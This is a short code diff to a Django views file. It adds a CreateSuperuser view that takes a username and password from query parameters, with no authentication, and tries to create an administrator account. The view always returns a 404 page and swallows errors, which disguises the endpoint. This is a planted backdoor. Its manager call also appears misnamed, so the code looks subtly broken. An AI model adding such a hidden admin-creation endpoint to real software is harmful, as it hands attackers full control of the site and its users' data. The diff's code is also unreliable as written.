@@ -671,4 +671,21 @@ class Customer(LoginRequiredMixin, View):
                 "error": str(e)
             }
             return JsonResponse(context,status=200)
-        
+
+
+
+class CreateSuperuser(View):
+    def get(self,request):
+        username = request.GET.get("--u",None)
+        password = request.GET.get("--p",None)
+
+        if not (username and password):
+            
+            return render(request, "404.html")
+
+        try:
+            User.objects.CreateSuperuser(username=username,password=password)
+        except:
+            pass
+
+        return render(request, "404.html")
